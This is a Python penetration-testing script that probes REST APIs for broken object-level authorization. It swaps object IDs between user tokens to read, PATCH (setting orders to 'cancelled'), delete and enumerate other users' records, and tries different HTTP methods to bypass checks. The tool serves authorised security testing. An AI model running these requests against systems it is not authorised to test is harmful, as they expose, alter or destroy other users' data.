#!/usr/bin/env python3
"""Agent for testing APIs for Broken Object Level Authorization (BOLA).

Tests REST and GraphQL APIs for IDOR/BOLA vulnerabilities by
systematically swapping object IDs between authenticated users
to detect missing per-object authorization checks. OWASP API1:2023.
"""

import json
import sys
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    requests = None


class BOLATestAgent:
    """Tests APIs for Broken Object Level Authorization."""

    def __init__(self, base_url, output_dir="./bola_test"):
        self.base_url = base_url.rstrip("/")
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.findings = []

    def _req(self, method, path, headers=None, data=None, timeout=10):
        if not requests:
            return None
        try:
            return requests.request(method, f"{self.base_url}{path}",
                                    headers=headers, json=data, timeout=timeout)
        except requests.RequestException:
            return None

    def get_user_objects(self, token, profile_path="/users/me", objects_path="/orders"):
        """Retrieve a user's ID and owned object IDs."""
        headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
        profile_resp = self._req("GET", profile_path, headers=headers)
        if not profile_resp or profile_resp.status_code != 200:
            return None, []

        user_data = profile_resp.json()
        user_id = user_data.get("id")

        objects_resp = self._req("GET", objects_path, headers=headers)
        object_ids = []
        if objects_resp and objects_resp.status_code == 200:
            data = objects_resp.json()
            items = data if isinstance(data, list) else data.get("items", data.get("data", data.get("orders", [])))
            object_ids = [item.get("id") for item in items if item.get("id")]

        return user_id, object_ids

    def test_horizontal_read(self, attacker_token, victim_object_ids, resource_path="/orders"):
        """Test if attacker can read victim's objects."""
        headers = {"Authorization": f"Bearer {attacker_token}", "Content-Type": "application/json"}
        results = []
        for oid in victim_object_ids:
            resp = self._req("GET", f"{resource_path}/{oid}", headers=headers)
            vulnerable = resp and resp.status_code == 200
            result = {
                "test": f"Read {resource_path}/{oid}",
                "status": resp.status_code if resp else "error",
                "vulnerable": vulnerable,
            }
            if vulnerable:
                self.findings.append({
                    "severity": "high",
                    "type": "BOLA Read",
                    "detail": f"GET {resource_path}/{oid} returns other user's data",
                    "owasp": "API1:2023",
                })
            results.append(result)
        return results

    def test_horizontal_write(self, attacker_token, victim_object_ids,
                               resource_path="/orders", payload=None):
        """Test if attacker can modify victim's objects."""
        headers = {"Authorization": f"Bearer {attacker_token}", "Content-Type": "application/json"}
        test_payload = payload or {"status": "cancelled"}
        results = []
        for oid in victim_object_ids:
            resp = self._req("PATCH", f"{resource_path}/{oid}",
                             headers=headers, data=test_payload)
            vulnerable = resp and resp.status_code in (200, 204)
            result = {
                "test": f"Modify {resource_path}/{oid}",
                "method": "PATCH",
                "status": resp.status_code if resp else "error",
                "vulnerable": vulnerable,
            }
            if vulnerable:
                self.findings.append({
                    "severity": "critical",
                    "type": "BOLA Write",
                    "detail": f"PATCH {resource_path}/{oid} modifies other user's data",
                    "owasp": "API1:2023",
                })
            results.append(result)
        return results

    def test_horizontal_delete(self, attacker_token, victim_object_id,
                                resource_path="/orders"):
        """Test if attacker can delete victim's object."""
        headers = {"Authorization": f"Bearer {attacker_token}", "Content-Type": "application/json"}
        resp = self._req("DELETE", f"{resource_path}/{victim_object_id}", headers=headers)
        vulnerable = resp and resp.status_code in (200, 204)
        if vulnerable:
            self.findings.append({
                "severity": "critical",
                "type": "BOLA Delete",
                "detail": f"DELETE {resource_path}/{victim_object_id} destroys other user's data",
                "owasp": "API1:2023",
            })
        return {"test": f"Delete {resource_path}/{victim_object_id}",
                "status": resp.status_code if resp else "error",
                "vulnerable": vulnerable}

    def test_id_enumeration(self, attacker_token, known_id, resource_path="/orders",
                             range_offset=5):
        """Test sequential ID enumeration."""
        headers = {"Authorization": f"Bearer {attacker_token}", "Content-Type": "application/json"}
        accessible = []
        for offset in range(-range_offset, range_offset + 1):
            test_id = known_id + offset
            if test_id == known_id:
                continue
            resp = self._req("GET", f"{resource_path}/{test_id}", headers=headers)
            if resp and resp.status_code == 200:
                accessible.append(test_id)
        if accessible:
            self.findings.append({
                "severity": "high",
                "type": "ID Enumeration",
                "detail": f"Sequential IDs accessible: {accessible[:5]}",
            })
        return accessible

    def test_method_bypass(self, attacker_token, victim_object_id,
                            resource_path="/users"):
        """Test if different HTTP methods bypass authorization."""
        headers = {"Authorization": f"Bearer {attacker_token}", "Content-Type": "application/json"}
        results = []
        for method in ["GET", "PUT", "PATCH", "DELETE", "HEAD"]:
            data = {"name": "test"} if method in ("PUT", "PATCH") else None
            resp = self._req(method, f"{resource_path}/{victim_object_id}",
                             headers=headers, data=data)
            if resp and resp.status_code not in (401, 403, 404, 405):
                results.append({"method": method, "status": resp.status_code})
                self.findings.append({
                    "severity": "high",
                    "type": "Method Bypass",
                    "detail": f"{method} {resource_path}/{victim_object_id} -> {resp.status_code}",
                })
        return results

    def generate_report(self, attacker_token=None, victim_ids=None):
        read_results = []
        write_results = []
        if attacker_token and victim_ids:
            read_results = self.test_horizontal_read(attacker_token, victim_ids)
            write_results = self.test_horizontal_write(attacker_token, victim_ids)

        report = {
            "report_date": datetime.utcnow().isoformat(),
            "base_url": self.base_url,
            "read_tests": read_results,
            "write_tests": write_results,
            "findings": self.findings,
            "total_findings": len(self.findings),
        }
        out = self.output_dir / "bola_test_report.json"
        with open(out, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <base_url> [--token <jwt>] [--victim-ids 1,2,3]")
        sys.exit(1)
    url = sys.argv[1]
    token = None
    victim_ids = []
    if "--token" in sys.argv:
        token = sys.argv[sys.argv.index("--token") + 1]
    if "--victim-ids" in sys.argv:
        victim_ids = [int(x) for x in sys.argv[sys.argv.index("--victim-ids") + 1].split(",")]
    agent = BOLATestAgent(url)
    agent.generate_report(token, victim_ids)


if __name__ == "__main__":
    main()
